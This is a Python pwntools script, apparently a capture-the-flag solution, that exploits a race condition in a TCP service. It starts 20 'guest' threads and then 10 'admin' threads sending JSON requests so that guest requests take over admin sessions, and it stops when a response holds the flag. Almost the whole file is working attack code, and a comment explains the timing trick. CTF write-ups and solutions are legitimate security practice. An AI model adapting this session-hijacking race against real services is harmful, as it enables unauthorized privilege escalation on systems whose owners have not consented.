#!/bin/env python

from requests import Session
from pwn import *
context.log_level = 'NOTSET'

import threading

DEBUG = False
LOCAL = False

if LOCAL:
    RHOST = '::1'
    RPORT = 3388
else:
    RHOST = '9000:9dc9:392:99a:216:3eff:fe8a:e928'
    RPORT = 7171

done = threading.Event()

# context.log_level = 100

Found=False
PRINTED=False
class Loop(threading.Thread):
    def __init__(self, user):
        threading.Thread.__init__(self)
        self.user = user

    def run(self):
        global PRINTED
        srv = tcp(RHOST, RPORT)
        while not done.is_set():
            srv.sendline('{"Type": 1, "Username": "' + self.user + '", "ApiKey": "ok", "Max": 5}')
            #srv.sendline('{"Type": 2, "Username": "' + self.user + '", "ApiKey": "ok", "Max": 5}') # create API keys
            rsp = srv.readline()
            if not PRINTED:
                print(rsp)
                PRINTED = True
            if b'FLAG-d9cf1c1ac494062e44d60902769441070113dca8' in rsp:
                FOUND = True
                done.set()
                pass


def main():
    N = 20
    N2 = 10
    info(f"Starting {N} threads for guest")

    for x in range(N):
        t = Loop("guest")
        t.start()

    # This sleep is critical: admin requests must only start coming in once the semaphore is filled with guest requests so that the 5 admins are forced to block
    # and return their session to the pool. The overflowed guests will thus end up using admin sessions.
    # sleep(10)


    info(f"Starting {N2} threads for admin")
    for x in range(N2):
        t = Loop("admin")
        t.start()
    done.wait()
    sleep(3)  # Let connections close.
    success("Flag 3 was found.")

main()
